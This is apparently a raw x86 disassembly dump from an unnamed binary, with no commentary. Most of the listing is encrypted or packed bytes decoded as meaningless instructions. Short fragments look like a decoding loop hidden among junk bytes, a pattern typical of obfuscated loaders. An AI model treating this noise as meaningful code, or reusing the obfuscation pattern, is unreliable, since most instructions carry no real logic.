  4059fc:	inc    ebx
  4059fd:	xor    DWORD PTR [ecx],esi
  4059ff:	push   ss
  405a00:	(bad)  
  405a01:	mov    al,0xaf
  405a03:	jno    0x405a65
  405a05:	(bad)  
  405a06:	or     al,0x8c
  405a08:	dec    ecx
  405a09:	jno    0x4059fd
  405a0b:	jae    0x4059bf
  405a0d:	loopne 0x4059d4
  405a0f:	test   DWORD PTR [esi],ebx
  405a11:	jnp    0x405a58
  405a13:	out    0x2d,al
  405a15:	(bad)  
  405a16:	jnp    0x405a69
  405a18:	add    dl,BYTE PTR [ecx-0x3]
  405a1b:	cmp    eax,0x7f3178e6
  405a20:	(bad)  [eax]
  405a22:	and    eax,0x7ebe99d5
  405a27:	jnp    0x405a7a
  405a29:	das    
  405a2a:	ds mov eax,0x33a31bdc
  405a30:	xchg   cx,ax
  405a33:	push   edx
  405a34:	adc    ecx,DWORD PTR [ecx+0x12c1517d]
  405a3a:	add    BYTE PTR [ecx-0x7],dl
  405a3d:	xchg   BYTE PTR [edx],dh
  405a3f:	push   esp
  405a40:	cmp    dl,BYTE PTR [ebx+edx*1-0x10a739e1]
  405a47:	sbb    eax,0x942305c4
  405a4c:	ficom  WORD PTR [esi+esi*8+0x1ddab885]
  405a53:	outs   dx,DWORD PTR cs:[esi]
  405a55:	cmp    eax,edi
  405a57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a58:	fistp  WORD PTR [esi-0x7f]
  405a5b:	inc    esi
  405a5c:	mov    cl,0xa6
  405a5e:	xor    eax,0xa252f8e0
  405a63:	(bad)  
  405a64:	iret   
  405a65:	out    0xf,al
  405a67:	xchg   BYTE PTR [edx],bl
  405a69:	fbld   TBYTE PTR [esi-0x13a6a9bf]
  405a6f:	test   ecx,eax
  405a71:	push   eax
  405a72:	pop    edi
  405a73:	fsub   QWORD PTR [esi+0x7f0405ea]
  405a79:	gs push cs
  405a7b:	inc    ebx
  405a7c:	aas    
  405a7d:	iret   
  405a7e:	xor    ah,BYTE PTR [ebp+ecx*4+0x52516b09]
  405a85:	sahf   
  405a86:	push   ebx
  405a87:	inc    edx
  405a88:	sbb    DWORD PTR [ecx+0x5eb0c25a],esp
  405a8e:	nop
  405a8f:	xor    dl,dh
  405a91:	jo     0x405a5c
  405a93:	add    BYTE PTR [esi],al
  405a95:	data16 mov dl,0xc4
  405a98:	data16 scas al,BYTE PTR es:[edi]
  405a9a:	arpl   WORD PTR [edi],bx
  405a9c:	lds    esp,FWORD PTR [eax-0x46]
  405a9f:	add    al,BYTE PTR [edx-0x57e5fb6b]
  405aa5:	dec    esp
  405aa6:	jno    0x405aa6
  405aa8:	add    eax,esi
  405aaa:	imul   edx,DWORD PTR [ebp-0x6a],0xffffffa3
  405aae:	or     al,0x45
  405ab0:	or     DWORD PTR ss:[ebx],edi
  405ab3:	push   ecx
  405ab4:	pop    es
  405ab5:	ficom  WORD PTR [ecx+ebx*2+0x4299f32e]
  405abc:	jmp    0x405b27
  405abe:	mov    eax,0xb90a9a41
  405ac3:	jge    0x405a75
  405ac5:	push   0xe9ebde69
  405aca:	sub    BYTE PTR [eax-0x5a],cl
  405acd:	loop   0x405b2a
  405acf:	xchg   edx,eax
  405ad0:	das    
  405ad1:	inc    esp
  405ad2:	adc    BYTE PTR [esp+edi*1],dh
  405ad5:	sub    bl,BYTE PTR [eax+0xe5ea613]
  405adb:	es pop edi
  405add:	lods   eax,DWORD PTR ds:[esi]
  405ade:	test   DWORD PTR [eax],0x3757d8a6
  405ae4:	jge    0x405b62
  405ae6:	push   ecx
  405ae7:	addr16 jp 0x405a94
  405aea:	(bad)  
  405aeb:	mov    dh,0x17
  405aed:	outs   dx,BYTE PTR ds:[esi]
  405aee:	sbb    al,0x7d
  405af0:	test   al,0x7
  405af2:	xchg   esp,eax
  405af3:	push   0x439ebbec
  405af8:	out    dx,eax
  405af9:	xor    esi,ebx
  405afb:	ins    DWORD PTR es:[edi],dx
  405afc:	fistp  DWORD PTR [edi]
  405afe:	mov    edi,0xf4ba9bad
  405b03:	das    
  405b04:	dec    edi
  405b05:	push   cs
  405b06:	push   ss
  405b07:	sbb    BYTE PTR [eax-0xa464384],ah
  405b0d:	add    esi,DWORD PTR [ebx+0x3a]
  405b10:	inc    eax
  405b11:	and    cl,BYTE PTR [ecx+0x64b11aa5]
  405b17:	pop    esp
  405b18:	sub    dl,BYTE PTR [eax+ebx*4-0x502bfd0]
  405b1f:	mov    bh,0x11
  405b21:	add    eax,0x2e622a1c
  405b26:	add    al,0xe9
  405b28:	outs   dx,BYTE PTR ds:[esi]
  405b29:	sub    ebx,DWORD PTR [edx]
  405b2b:	push   cs
  405b2c:	mov    eax,ds:0xf368e4e4
  405b31:	jp     0x405b89
  405b33:	sbb    BYTE PTR [ebp+0x56],al
  405b36:	inc    esp
  405b37:	outs   dx,DWORD PTR ds:[esi]
  405b38:	fsubp  st(2),st
  405b3a:	push   edx
  405b3b:	or     eax,ebp
  405b3d:	pop    ss
  405b3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b3f:	and    ecx,ebx
  405b41:	int    0x75
  405b43:	add    BYTE PTR [eax-0x45],al
  405b46:	fnstcw WORD PTR [ebx]
  405b48:	mov    al,ds:0x55740db8
  405b4d:	test   eax,0x1c048012
  405b52:	out    dx,al
  405b53:	mov    edi,0x47f8c7eb
  405b58:	push   ebx
  405b59:	test   DWORD PTR [ecx],edx
  405b5b:	xchg   edi,eax
  405b5c:	mov    al,ds:0xccc93d58
  405b61:	xchg   BYTE PTR ds:0x8e2a2a7c,bl
  405b67:	and    ch,bl
  405b69:	lock push edi
  405b6b:	mov    ch,0xcf
  405b6d:	stc    
  405b6e:	dec    esi
  405b6f:	dec    ebx
  405b70:	retf   0xe149
  405b73:	jmp    0xb121efcf
  405b78:	add    bh,BYTE PTR [edx]
  405b7a:	in     al,0x1c
  405b7c:	aad    0xf0
  405b7e:	sub    al,0xab
  405b80:	jp     0x405b2d
  405b82:	dec    ebx
  405b83:	ins    BYTE PTR es:[edi],dx
  405b84:	div    BYTE PTR [edi]
  405b86:	and    ah,BYTE PTR [ebp+0x496b2d66]
  405b8c:	into   
  405b8d:	addr16 into 
  405b8f:	sbb    BYTE PTR ds:0xb8a08c6a,dl
  405b95:	mov    cl,0x36
  405b97:	in     eax,0x1e
  405b99:	fprem  
  405b9b:	frstor [esp+ecx*8]
  405b9e:	sahf   
  405b9f:	repnz shl BYTE PTR [edx-0x7552c3b4],1
  405ba6:	xchg   ebx,eax
  405ba7:	shl    DWORD PTR [edx-0x2f9d3baf],cl
  405bad:	je     0x405bfc
  405baf:	adc    ch,BYTE PTR ds:0xdca2bb23
  405bb5:	loope  0x405c0b
  405bb7:	pop    ebp
  405bb8:	mov    cl,0x43
  405bba:	mov    esp,0x22ea5c81
  405bbf:	mov    ebp,0xfffd344d
  405bc4:	ret    0xf966
  405bc7:	mov    cl,0x76
  405bc9:	xchg   edi,eax
  405bca:	add    BYTE PTR [edi],bh
  405bcc:	scas   al,BYTE PTR es:[edi]
  405bcd:	push   ebp
  405bce:	push   eax
  405bcf:	adc    BYTE PTR [ecx+0x40],cl
  405bd2:	rcr    BYTE PTR [esi],1
  405bd4:	call   0x38c:0x23e4dba9
  405bdb:	jno    0x405c15
  405bdd:	mov    esi,0xd268d5c
  405be2:	call   0x1788:0x61022770
  405be9:	mov    ah,0xe
  405beb:	ror    DWORD PTR [edx+esi*2],cl
  405bee:	mov    dl,0xca
  405bf0:	inc    ebp
  405bf1:	pop    ss
  405bf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bf3:	out    0x71,al
  405bf5:	daa    
  405bf6:	push   edi
  405bf7:	outs   dx,BYTE PTR ds:[esi]
  405bf8:	jno    0x405bdc
  405bfa:	icebp  
  405bfb:	xchg   esp,eax
  405bfc:	sbb    ebx,DWORD PTR [edi]
  405bfe:	sub    ah,ah
  405c00:	inc    ecx
  405c01:	gs sbb eax,0x7727ca96
  405c07:	cmp    edx,DWORD PTR [edx]
  405c09:	(bad)  
  405c0a:	jg     0x405bb5
  405c0c:	sub    BYTE PTR [esi+0x3f82b53],bh
  405c12:	jge    0x405c24
  405c14:	xor    edx,ecx
  405c16:	add    edx,esi
  405c18:	cmp    edx,edi
  405c1a:	ja     0x406428
  405c20:	push   ebx
  405c21:	jmp    0x405c2b
  405c26:	mov    esi,0x32729d
  405c2b:	mov    eax,DWORD PTR [ebp-0x8]
  405c2e:	mov    edi,DWORD PTR [ebp-0x4]
  405c31:	xor    edi,ecx
  405c33:	jmp    0x40600f
  405c38:	test   DWORD PTR [edx-0x7c],0x79ec5dea
  405c3f:	arpl   WORD PTR ds:0x3b5d0ed0,dx
  405c45:	jmp    0x3b908adc
  405c4a:	jle    0x405cca
  405c4c:	mov    ebp,0x517e7e71
  405c51:	and    edi,DWORD PTR [bp+di+0x27]
  405c55:	pusha  
  405c56:	jecxz  0x405cc3
  405c58:	cli    
  405c59:	xchg   esp,eax
  405c5a:	fmul   DWORD PTR [ebp-0x50]
  405c5d:	cmp    eax,0xf072f162
  405c62:	pop    esp
  405c63:	mov    edi,0xead9ba55
  405c68:	mov    DWORD PTR [ebp-0x1b],ebp
  405c6b:	sub    BYTE PTR [eax-0x5ca50535],dl
  405c71:	xchg   esp,eax
  405c72:	xor    al,0x85
  405c74:	push   ebx
  405c75:	mov    ebp,0x5a5eb36b
  405c7a:	mov    WORD PTR [eax],ds
  405c7c:	gs mov esi,0x9b2eab41
  405c82:	aam    0xfe
  405c84:	leave  
  405c85:	sub    BYTE PTR [edx-0x123c303a],al
  405c8b:	fiadd  WORD PTR [ebx+0x7e]
  405c8e:	fidivr DWORD PTR [ecx]
  405c90:	jecxz  0x405c7f
  405c92:	xchg   ebp,eax
  405c93:	sub    DWORD PTR [ebx],eax
  405c95:	push   ds
  405c96:	adc    edi,DWORD PTR [esi]
  405c98:	stos   BYTE PTR es:[edi],al
  405c99:	mov    ebx,0x9a84b0ae
  405c9e:	repnz dec esi
  405ca0:	repnz mov ch,0x7f
  405ca3:	xchg   ecx,ebp
  405ca5:	mov    edi,0x1dff8ff8
  405caa:	adc    al,0x54
  405cac:	mov    ebx,0x6e2e6fcc
  405cb1:	dec    ecx
  405cb2:	lods   eax,DWORD PTR ds:[esi]
  405cb3:	out    dx,eax
  405cb4:	mov    al,es:0x66087ccf
  405cba:	add    ebx,edx
  405cbc:	aaa    
  405cbd:	mov    edx,0xb6890e59
  405cc2:	fstcw  WORD PTR [ecx+0x53]
  405cc6:	and    dh,bh
  405cc8:	ror    BYTE PTR [ecx+0x28],cl
  405ccb:	inc    edx
  405ccc:	sbb    DWORD PTR [edi+esi*4+0x25],edi
  405cd0:	fsubr  DWORD PTR [edx]
  405cd2:	jae    0x405d37
  405cd4:	push   edi
  405cd5:	or     eax,0xb8cbd621
  405cda:	shr    BYTE PTR [ebx],1
  405cdc:	retf   
  405cdd:	popw   ss
  405cdf:	push   0x935406a0
  405ce4:	nop
  405ce5:	jecxz  0x405d44
  405ce7:	in     eax,0xf5
  405ce9:	mov    bh,0xa0
  405ceb:	or     BYTE PTR [eax+eax*1],al
  405cee:	cdq    
  405cef:	jge    0x405d05
  405cf1:	pop    edi
  405cf2:	(bad)  
  405cf3:	mov    eax,0x9b566440
  405cf8:	mov    dl,0x9a
  405cfa:	out    0x4a,eax
  405cfc:	int3   
  405cfd:	xor    bh,cl
  405cff:	sbb    al,0xa6
  405d01:	js     0x405d7b
  405d03:	xchg   BYTE PTR es:[ebx],ah
  405d06:	push   ecx
  405d07:	mov    ds,WORD PTR [edi-0x1f]
  405d0a:	arpl   cx,cx
  405d0c:	push   0xddce9fca
  405d11:	sub    dh,BYTE PTR [ebx+eiz*4+0xd7496c]
  405d18:	data16 jno 0x405d94
  405d1b:	imul   eax,DWORD PTR [eax+esi*2],0x5f
  405d1f:	stos   BYTE PTR es:[edi],al
  405d20:	pop    edx
  405d21:	push   ds
  405d22:	pop    eax
  405d23:	std    
  405d24:	ja     0x405d41
  405d26:	xchg   BYTE PTR [ecx+0x4],ch
  405d29:	adc    DWORD PTR [ebx+0x49],edi
  405d2c:	outs   dx,DWORD PTR ds:[esi]
  405d2d:	fisttp QWORD PTR [eax]
  405d2f:	aad    0xc6
  405d31:	stos   DWORD PTR es:[edi],eax
  405d32:	ret    
  405d33:	add    DWORD PTR [esi+0x29],eax
  405d36:	fwait
  405d37:	xchg   ebx,eax
  405d38:	push   edx
  405d39:	out    dx,eax
  405d3a:	stc    
  405d3b:	jmp    FWORD PTR [ecx]
  405d3d:	stos   BYTE PTR es:[edi],al
  405d3e:	cli    
  405d3f:	inc    edx
  405d41:	xor    ebx,DWORD PTR [esi+eiz*1+0x5872cb8]
  405d48:	icebp  
  405d49:	mov    bh,cl
  405d4b:	sub    BYTE PTR [eax+0x1272d1a2],dl
  405d51:	ficom  WORD PTR [ebx-0x6df4824b]
  405d57:	cdq    
  405d58:	or     eax,0xe83a1633
  405d5d:	push   edx
  405d5e:	mov    cl,0x8c
  405d60:	push   edi
  405d61:	push   0xfe43bd4
  405d66:	xchg   esp,eax
  405d67:	int    0x68
  405d69:	aaa    
  405d6a:	xchg   esi,eax
  405d6b:	mov    edx,0xab4475aa
  405d70:	mov    DWORD PTR [ebp+0x36],edi
  405d73:	mov    DWORD PTR [eax+ebx*2-0x1c4877b],esi
  405d7a:	pop    esp
  405d7b:	xchg   ecx,eax
  405d7c:	(bad)  
  405d7d:	cmp    bl,BYTE PTR [edx+0x55c33910]
  405d83:	retf   0x4716
  405d86:	sbb    DWORD PTR [eax-0x15d51287],ebx
  405d8c:	sbb    BYTE PTR ss:[esi],0xc2
  405d90:	mov    al,ds:0xb2a6f34c
  405d95:	xchg   edi,eax
  405d96:	push   edi
  405d97:	dec    ebp
  405d98:	mov    ss,WORD PTR [edx+0x40]
  405d9b:	inc    ecx
  405d9c:	adc    eax,0x885500a0
  405da1:	jp     0x405d4b
  405da3:	mov    esi,0x4f1f3dd4
  405da8:	inc    edx
  405da9:	fwait
  405daa:	pop    eax
  405dab:	and    eax,ecx
  405dad:	or     eax,DWORD PTR [edx]
  405daf:	stc    
  405db0:	pop    edi
  405db1:	xor    BYTE PTR [eax+eiz*4+0x55],ah
  405db5:	mov    edx,ebp
  405db7:	bound  ebx,QWORD PTR [ecx]
  405db9:	cld    
  405dba:	data16 mov ds:0xbf73212a,al
  405dc0:	les    esi,FWORD PTR [edi]
  405dc2:	std    
  405dc3:	rcl    DWORD PTR [esi+0x266e1173],cl
  405dc9:	stos   BYTE PTR es:[edi],al
  405dca:	push   es
  405dcb:	inc    ebx
  405dcc:	dec    ecx
  405dcd:	cmp    dl,bh
  405dcf:	aaa    
  405dd0:	mov    ecx,fs
  405dd2:	jp     0x405e30
  405dd4:	sub    bh,ah
  405dd6:	dec    ebx
  405dd7:	inc    ebp
  405dd8:	mov    eax,0xa0a423a0
  405ddd:	xchg   ebx,eax
  405dde:	outs   dx,BYTE PTR ds:[esi]
  405ddf:	push   ebp
  405de0:	pop    ebp
  405de1:	jl     0x405db9
  405de3:	into   
  405de4:	or     al,0x8d
  405de6:	mov    ds:0xa758f4dc,eax
  405deb:	xor    BYTE PTR [ebx+edi*4+0x6c],bl
  405def:	lock int 0x1e
  405df2:	fcomip st,st(5)
  405df4:	jns    0x405e1f
  405df6:	je     0x405e08
  405df8:	in     al,dx
  405df9:	or     DWORD PTR [edi+0x7],ebp
  405dfc:	ins    BYTE PTR es:[edi],dx
  405dfd:	dec    edx
  405dfe:	xlat   BYTE PTR ss:[ebx]
  405e00:	push   esi
  405e01:	pop    es
  405e02:	xchg   esi,eax
  405e03:	adc    ecx,0xffffffe5
  405e06:	inc    esp
  405e07:	jmp    0x405e36
  405e09:	inc    esp
  405e0a:	xor    eax,0x4c42687f
  405e0f:	adc    DWORD PTR [ebp+0x374aa4d1],0x23
  405e16:	inc    edi
  405e17:	mov    ah,0xb9
  405e19:	(bad)  
  405e1a:	loope  0x405e1b
  405e1c:	adc    ecx,DWORD PTR [edi+0x5d]
  405e1f:	inc    ecx
  405e20:	mov    edx,0x7c1c338b
  405e25:	inc    edi
  405e26:	cld    
  405e27:	push   cs
  405e28:	pop    DWORD PTR [ebx+0x20]
  405e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e2c:	adc    BYTE PTR [ebx-0xf],ch
  405e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e30:	fsubr  DWORD PTR [esi-0x3c]
  405e33:	jnp    0x405e08
  405e35:	push   0x7935002b
  405e3a:	loopne 0x405dc1
  405e3c:	stos   BYTE PTR es:[edi],al
  405e3d:	mov    DWORD PTR ss:[ebp+0x317db3d6],esp
  405e44:	xor    eax,0xfc2decbf
  405e49:	in     eax,dx
  405e4a:	(bad)  
  405e4b:	enter  0x1b7c,0xdd
  405e4f:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e52:	out    0xa3,al
  405e54:	int3   
  405e55:	fs test eax,0x9dd09882
  405e5b:	into   
  405e5c:	mov    edx,edx
  405e5e:	and    DWORD PTR [edi-0x8aa515b],0x59
  405e65:	hlt    
  405e66:	fmul   st,st(7)
  405e68:	call   0x7c1e23de
  405e6d:	lea    eax,[esi-0x516e06fc]
  405e73:	push   edx
  405e74:	lods   al,BYTE PTR ds:[esi]
  405e75:	aam    0x86
  405e77:	cld    
  405e78:	inc    ebx
  405e79:	mov    cl,0xf
  405e7b:	test   DWORD PTR [edx],ebx
  405e7d:	mov    bh,0xc7
  405e7f:	jno    0x405e0b
  405e81:	sub    dl,BYTE PTR [esi+0x42]
  405e84:	adc    edi,DWORD PTR [ebx+eax*2-0x4c1e9add]
  405e8b:	add    ch,BYTE PTR [edx+ebp*2+0x59]
  405e8f:	scas   eax,DWORD PTR es:[edi]
  405e90:	cmc    
  405e91:	loop   0x405ea6
  405e93:	(bad)  
  405e94:	(bad)  
  405e95:	fild   WORD PTR [edx+0x6]
  405e98:	scas   eax,DWORD PTR es:[edi]
  405e99:	popf   
  405e9a:	into   
  405e9b:	sbb    BYTE PTR [edx+edx*1+0x64fc50e5],ah
  405ea2:	inc    esi
  405ea3:	mov    ds:0xafef2b9a,al
  405ea8:	enter  0x9b9e,0x8d
  405eac:	pop    ebp
  405ead:	jo     0x405ef4
  405eaf:	inc    esp
  405eb0:	add    al,0x5
  405eb2:	and    BYTE PTR [eax+edi*1],dl
  405eb5:	neg    ch
  405eb7:	imul   ebx,esp,0xe
  405eba:	retf   0xd8e9
  405ebd:	das    
  405ebe:	inc    ebx
  405ebf:	div    dh
  405ec1:	mov    edi,0xf2949c11
  405ec6:	js     0x405e51
  405ec8:	arpl   dx,dx
  405eca:	fld    QWORD PTR [ebx-0x2a1e2a73]
  405ed0:	das    
  405ed1:	xor    eax,0x2ebbe25b
  405ed6:	mov    dh,0x6d
  405ed8:	and    DWORD PTR [ebp+edi*8+0x5b53fdb8],esp
  405edf:	mov    ch,BYTE PTR [ebx]
  405ee1:	scas   al,BYTE PTR es:[edi]
  405ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ee3:	cs ret 0x7946
  405ee7:	fwait
  405ee8:	leave  
  405ee9:	cmp    ch,BYTE PTR [esi+edx*1+0x3f0d5e33]
  405ef0:	sbb    cl,BYTE PTR [edx]
  405ef2:	leave  
  405ef3:	dec    DWORD PTR [esi+0x2b2f019d]
  405ef9:	in     eax,dx
  405efa:	xchg   BYTE PTR [ecx],dh
  405efc:	ret    
  405efd:	neg    DWORD PTR [esi]
  405eff:	pop    eax
  405f00:	scas   al,BYTE PTR es:[edi]
  405f01:	cld    
  405f02:	or     eax,DWORD PTR [esi+0x46c7a1a4]
  405f08:	pushf  
  405f09:	sti    
  405f0a:	xlat   BYTE PTR ds:[ebx]
  405f0b:	sub    DWORD PTR [esi],0x40
  405f0e:	out    dx,al
  405f0f:	sub    eax,0x7f3127ee
  405f14:	retf   
  405f15:	push   esi
  405f16:	pop    eax
  405f17:	pop    ebp
  405f18:	sbb    DWORD PTR [edx-0x45aa1a54],0xffffff89
  405f1f:	and    eax,0x3dd3ce1d
  405f24:	mov    eax,ds:0x66125e97
  405f29:	(bad)  
  405f2b:	loop   0x405f43
  405f2d:	ins    DWORD PTR es:[edi],dx
  405f2e:	in     al,0x21
  405f30:	xlat   BYTE PTR ds:[ebx]
  405f31:	outs   dx,BYTE PTR ds:[esi]
  405f32:	dec    edi
  405f33:	in     al,dx
  405f34:	jns    0x405f98
  405f36:	jecxz  0x405ee1
  405f38:	xor    esp,edx
  405f3a:	jbe    0x405ed7
  405f3c:	xchg   edi,eax
  405f3d:	pop    ds
  405f3e:	mov    al,ds:0x24c68eb0
  405f43:	push   es
  405f44:	hlt    
  405f45:	jb     0x405f41
  405f47:	mov    dh,0xd9
  405f49:	mov    DWORD PTR [ebx-0x5c53232b],esi
  405f4f:	aaa    
  405f50:	in     eax,0xc9
  405f52:	call   0xb53b:0xbf8c304d
  405f59:	mov    dl,0x74
  405f5b:	pop    ds
  405f5c:	mov    al,ds:0x3dab4b1d
  405f61:	es push ds
  405f63:	adc    ch,ah
  405f65:	je     0x405f79
  405f67:	sti    
  405f68:	(bad)  
  405f6a:	xor    DWORD PTR [ebp-0x5db674d1],ecx
  405f70:	fild   DWORD PTR [ebx]
  405f72:	out    0x47,eax
  405f74:	(bad)  
  405f75:	in     eax,dx
  405f76:	adc    bh,al
  405f78:	pop    esi
  405f79:	sbb    al,0x16
  405f7b:	aaa    
  405f7c:	and    ebx,esp
  405f7e:	cmp    DWORD PTR ds:0x70648bd6,eax
  405f84:	arpl   WORD PTR [ebx+0x68],bx
  405f87:	jle    0x405fc0
  405f89:	outs   dx,BYTE PTR ds:[esi]
  405f8a:	lock inc esi
  405f8c:	push   esi
  405f8d:	fldcw  WORD PTR [edi+edx*1]
  405f90:	gs push ecx
  405f92:	jl     0x405f4b
  405f94:	jo     0x405f42
  405f96:	mov    bl,0x58
  405f98:	and    edi,DWORD PTR [eax+eiz*4]
  405f9b:	call   0x8df3:0x38bd3d21
  405fa2:	lods   eax,DWORD PTR ds:[esi]
  405fa3:	mov    edi,0x6e68d6f1
  405fa8:	and    edx,DWORD PTR [esi]
  405faa:	(bad)  
  405fab:	aad    0xf6
  405fad:	stos   BYTE PTR es:[edi],al
  405fae:	adc    ecx,DWORD PTR [ecx+esi*4+0x32df3688]
  405fb5:	pop    ss
  405fb6:	sbb    al,dl
  405fb8:	mov    eax,0x3198cbba
  405fbd:	fisub  DWORD PTR [ebx-0x1b]
  405fc0:	add    dl,BYTE PTR [esi]
  405fc2:	pushf  
  405fc3:	and    DWORD PTR [ebx+0x50],edi
  405fc6:	repz repz gs in al,0xe5
  405fcb:	imul   esi,DWORD PTR [edi],0x797e36c2
  405fd1:	xor    DWORD PTR ss:[edi-0x48],ebp
  405fd5:	cmp    eax,0xdd697555
  405fda:	mov    eax,DWORD PTR [edi-0x36]
  405fdd:	inc    eax
  405fde:	pop    ecx
  405fdf:	xor    al,BYTE PTR [ebx+0x2dbc4130]
  405fe5:	imul   ebp,DWORD PTR cs:[edx+ebx*1-0x323df1b4],0xffffff8c
  405fee:	mov    eax,0x1ef275d1
  405ff3:	(bad)  
  405ff5:	fwait
  405ff6:	lods   al,BYTE PTR ds:[esi]
  405ff7:	ins    DWORD PTR es:[edi],dx
  405ff8:	mov    WORD PTR [edx-0x3554066c],gs
  405ffe:	ret    0x7a20
  406001:	or     al,0x6f
  406003:	sti    
  406004:	lods   al,BYTE PTR ds:[esi]
  406005:	sub    BYTE PTR [edx],0x32
  406008:	push   es
  406009:	adc    edx,DWORD PTR [ecx]
  40600b:	xor    dl,BYTE PTR [edi-0x1fc87b6]
  406011:	mov    esi,DWORD PTR [ebp+0x8]
  406014:	imul   edi,edx
  406017:	mov    ebx,DWORD PTR [ebp+0xc]
  40601a:	xor    eax,ecx
  40601c:	add    eax,edx
  40601e:	mov    al,BYTE PTR [ebx+eax*1+0x32729d]
  406025:	mov    BYTE PTR [edi+esi*1],al
  406028:	mov    eax,DWORD PTR [ebp-0x4]
  40602b:	xor    eax,ecx
  40602d:	lea    edx,[edx+eax*1+0x32729d]
  406034:	mov    eax,DWORD PTR [ebp-0x4]
  406037:	xor    eax,ecx
  406039:	mov    esi,0xffcd8d63
  40603e:	sub    esi,eax
  406040:	add    esi,DWORD PTR [ebp+0x10]
  406043:	cmp    edx,esi
  406045:	jmp    0x406421
  40604a:	fdivr  st(7),st
  40604c:	es fwait
  40604e:	jge    0x40600b
  406050:	jge    0x40609b
  406052:	jae    0x4060cf
  406054:	dec    edx
  406055:	pusha  
  406056:	pop    edi
  406057:	xor    ecx,esi
  406059:	(bad)  
  40605a:	lahf   
  40605b:	aas    
  40605c:	jle    0x4060dc
  40605e:	mov    ebp,0x9f7e7e71
  406063:	dec    ebp
  406064:	mov    esi,0x31de4ba4
  406069:	mov    ?,WORD PTR [ebx-0x6c6abe8b]
  40606f:	inc    ebx
  406070:	mov    ah,0xeb
  406072:	lea    eax,[ebx+ecx*2]
  406075:	pop    edi
  406076:	mov    BYTE PTR [esi],dl
  406078:	clc    
  406079:	test   eax,0xbbf10f0f
  40607e:	cmp    eax,0x51bd209f
  406083:	add    ebp,edi
  406085:	mov    DWORD PTR [edi],ebx
  406087:	nop
  406088:	jne    0x40606d
  40608a:	out    0x96,eax
  40608c:	add    DWORD PTR [eax],ecx
  40608e:	xchg   ebp,eax
  40608f:	adc    esi,ebp
  406091:	jmp    0xdfa46da2
  406096:	inc    edx
  406097:	cdq    
  406098:	adc    eax,0x8afb5fd0
  40609d:	xchg   ebp,eax
  40609e:	xor    bl,ah
  4060a0:	sbb    eax,0x7039b506
  4060a5:	mov    BYTE PTR [edx+esi*1],ah
  4060a8:	les    ecx,FWORD PTR [ebp+0x2ae198fc]
  4060ae:	xchg   ebp,eax
  4060af:	das    
  4060b0:	cmp    ch,BYTE PTR [ebx-0x3f2e267]
  4060b6:	cmpps  xmm3,xmm1,0xb3
  4060ba:	and    eax,0xfd8f3dce
  4060bf:	sub    BYTE PTR [eax+0x76],ch
  4060c2:	repnz daa 
  4060c4:	adc    al,0x6f
  4060c6:	fdivr  QWORD PTR [eax-0x3c]
  4060c9:	sbb    DWORD PTR [edi],esp
  4060cb:	push   eax
  4060cc:	cmp    BYTE PTR [esi+0x18],bl
  4060cf:	loop   0x406067
  4060d1:	jge    0x406117
  4060d3:	gs xchg edx,eax
  4060d5:	pop    ecx
  4060d6:	das    
  4060d7:	mov    al,0x31
  4060d9:	jbe    0x406097
  4060db:	popf   
  4060dc:	pop    ecx
  4060dd:	rol    al,1
  4060df:	push   eax
  4060e0:	mov    eax,0x21f99ba0
  4060e5:	les    eax,FWORD PTR [eax+esi*8-0x6d82754d]
  4060ec:	xchg   esi,eax
  4060ed:	das    
  4060ee:	xor    DWORD PTR [ebx],ecx
  4060f0:	pop    es
  4060f1:	sbb    eax,0x94761aa4
  4060f6:	(bad)  
  4060f8:	jge    0x40607b
  4060fa:	and    eax,0x9f75927b
  4060ff:	xchg   ebx,eax
  406100:	push   edi
  406101:	push   es
  406102:	popf   
  406103:	jb     0x406140
  406105:	xor    eax,0x12a24a70
  40610a:	cmp    eax,0xd7380dcd
  40610f:	scas   eax,DWORD PTR es:[edi]
  406110:	xchg   edx,edx
  406112:	daa    
  406113:	int    0x4c
  406115:	pop    ss
  406116:	pusha  
  406117:	aaa    
  406118:	cld    
  406119:	gs ror ah,cl
  40611c:	add    BYTE PTR [ebp+edi*2+0x65fd65a0],ah
  406123:	jae    0x4060ac
  406125:	loop   0x4060fd
  406127:	call   0x3085cae3
  40612c:	mov    edx,0x4ee3ee4f
  406131:	sub    al,BYTE PTR [esi]
  406133:	mov    fs,ecx
  406135:	loopne 0x406157
  406137:	ficomp WORD PTR [ebp+0x258d0340]
  40613d:	cmp    eax,0x2e080637
  406142:	xchg   ecx,eax
  406143:	iret   
  406144:	fwait
  406145:	xchg   DWORD PTR [edx+0x6f],edx
  406148:	add    edx,DWORD PTR [ebx]
  40614a:	mov    eax,0x6bfa3efb
  40614f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406151:	je     0x4061b8
  406153:	adc    BYTE PTR [ebp-0x77],ch
  406156:	adc    DWORD PTR [esp-0x76045f40],esi
  40615d:	fld    DWORD PTR [ebx+ebp*4-0x68ffbb08]
  406164:	into   
  406165:	sub    bl,BYTE PTR [ecx]
  406167:	sub    eax,0x6e89ed52
  40616c:	std    
  40616d:	or     al,0x98
  40616f:	jp     0x4061ed
  406171:	call   0x6db1:0x8653f588
  406178:	daa    
  406179:	in     eax,0x82
  40617b:	shl    DWORD PTR [ecx],1
  40617d:	sbb    eax,0xf230ad0
  406182:	mov    esi,0xac5e8880
  406187:	popa   
  406188:	mov    edx,0xb575d090
  40618d:	bound  ebp,QWORD PTR [ecx]
  40618f:	push   cs
  406190:	pop    edi
  406191:	add    ah,BYTE PTR [ebp+0x3feb73bc]
  406197:	mov    fs,ebx
  406199:	xor    DWORD PTR [edx-0x32],esp
  40619c:	hlt    
  40619d:	jl     0x4061b6
  40619f:	xchg   edx,eax
  4061a0:	cmp    eax,0x241a4c38
  4061a5:	aaa    
  4061a6:	push   ds
  4061a7:	das    
  4061a8:	add    BYTE PTR [ebp+0x13],ch
  4061ab:	not    BYTE PTR [bp+si-0x3b74]
  4061b0:	sub    dh,BYTE PTR [ebp-0x3dded36c]
  4061b6:	mov    eax,ds:0x90e4b455
  4061bb:	iret   
  4061bc:	mov    ds:0xf80cc710,al
